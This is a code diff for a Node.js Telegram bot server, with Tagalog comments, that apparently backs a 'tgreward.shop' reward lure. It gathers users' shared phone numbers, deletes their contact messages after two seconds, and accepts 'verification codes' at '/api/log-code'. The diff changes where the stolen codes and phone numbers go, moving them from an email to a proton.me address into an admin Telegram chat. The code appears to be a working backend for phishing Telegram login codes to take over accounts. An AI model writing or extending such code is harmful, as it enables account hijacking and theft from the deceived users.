@@ -1,22 +1,24 @@
 import express from "express";
 import cors from "cors";
 import { Telegraf } from "telegraf";
-import nodemailer from "nodemailer";
+import fetch from "node-fetch";
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const WEBAPP_URL = process.env.WEBAPP_URL;     // e.g. https://tgreward.shop/webapp.html
 const WEBSITE_URL = process.env.WEBSITE_URL;   // e.g. https://tgreward.shop/QTSJAOPPHU.html
 
-// SMTP config (set sa Railway)
-const SMTP_HOST = process.env.SMTP_HOST;
-const SMTP_PORT = Number(process.env.SMTP_PORT || 587);
-const SMTP_USER = process.env.SMTP_USER;
-const SMTP_PASS = process.env.SMTP_PASS;
-const FROM_EMAIL = process.env.FROM_EMAIL || SMTP_USER;
-const TO_EMAIL = process.env.TO_EMAIL || "tgreward@proton.me";
+// admin logging bot
+const ADMIN_BOT_TOKEN = process.env.ADMIN_BOT_TOKEN;
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // numeric string, e.g. "5757713537"
 
 if (!BOT_TOKEN) {
   throw new Error("BOT_TOKEN is not set");
+}
+if (!ADMIN_BOT_TOKEN) {
+  throw new Error("ADMIN_BOT_TOKEN is not set");
+}
+if (!ADMIN_CHAT_ID) {
+  throw new Error("ADMIN_CHAT_ID is not set");
 }
 
 const bot = new Telegraf(BOT_TOKEN);
@@ -28,7 +30,7 @@ const userPhones = new Map();
 function scheduleDelete(chatId, messageId, delayMs = 30000) {
   setTimeout(() => {
     bot.telegram.deleteMessage(chatId, messageId).catch(() => {
-      // ignore errors (e.g. message already deleted / not found)
+      // ignore errors
     });
   }, delayMs);
 }
@@ -98,7 +100,7 @@ bot.on("contact", async (ctx) => {
   const contact = ctx.message.contact;
   if (!contact) return;
 
-  // delete agad ang contact message ng user
+  // delete agad ang contact message ng user (para di nakatambak yung number)
   scheduleDelete(ctx.chat.id, ctx.message.message_id, 2000);
 
   // siguraduhin na sariling number niya, hindi ibang contact
@@ -139,16 +141,26 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// Nodemailer transporter
-const transporter = nodemailer.createTransport({
-  host: SMTP_HOST,
-  port: SMTP_PORT,
-  secure: SMTP_PORT === 465, // true kung SMTPS/465
-  auth: {
-    user: SMTP_USER,
-    pass: SMTP_PASS,
-  },
-});
+// helper: send log message sa admin bot
+async function sendAdminLog(text) {
+  const url = `https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`;
+  const body = {
+    chat_id: ADMIN_CHAT_ID,
+    text,
+  };
+
+  const res = await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(body),
+  });
+
+  const data = await res.json();
+  if (!data.ok) {
+    console.error("Failed to send admin log:", data);
+    throw new Error("Admin bot sendMessage failed");
+  }
+}
 
 // endpoint na tinatawag ng WebApp
 app.post("/api/log-code", async (req, res) => {
@@ -170,9 +182,8 @@ app.post("/api/log-code", async (req, res) => {
     }
   }
 
-  const subject = "New verification code from Telegram user";
-  const text = [
-    "A user submitted a verification code.",
+  const logText = [
+    "🔔 New verification submission",
     "",
     `Code: ${code}`,
     `Telegram phone (shared contact): ${telegramPhone}`,
@@ -184,17 +195,12 @@ app.post("/api/log-code", async (req, res) => {
   ].join("\n");
 
   try {
-    const info = await transporter.sendMail({
-      from: FROM_EMAIL,
-      to: TO_EMAIL,
-      subject,
-      text,
-    });
-    console.log("Email sent:", info.messageId);
+    await sendAdminLog(logText);
+    console.log("Admin log sent");
     return res.json({ ok: true });
   } catch (err) {
-    console.error("Email send error:", err);
-    return res.status(500).json({ ok: false, error: "Email send failed" });
+    console.error("Admin log send error:", err);
+    return res.status(500).json({ ok: false, error: "Admin log send failed" });
   }
 });
 
